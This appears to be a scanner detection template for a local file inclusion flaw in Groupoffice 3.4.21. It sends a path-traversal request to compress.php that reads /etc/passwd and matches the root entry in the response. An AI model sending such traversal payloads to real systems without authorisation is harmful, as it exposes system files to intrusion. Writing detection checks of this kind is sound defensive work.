id: groupoffice-lfi
name: Groupoffice 3.4.21 - Local File Inclusion
severity: high
confidence: tentative
description: Groupoffice 3.4.21 is vulnerable to local file inclusion.
reference: CWE-22
tags:
- groupoffice
- lfi
- traversal
- vuln
requests:
- method: GET
  path: /compress.php?file=../../../../../../../etc/passwd
  matchers:
  - type: regex
    regex:
    - root:[x*]:0:0
  - type: status
    status:
    - 200
  condition: and
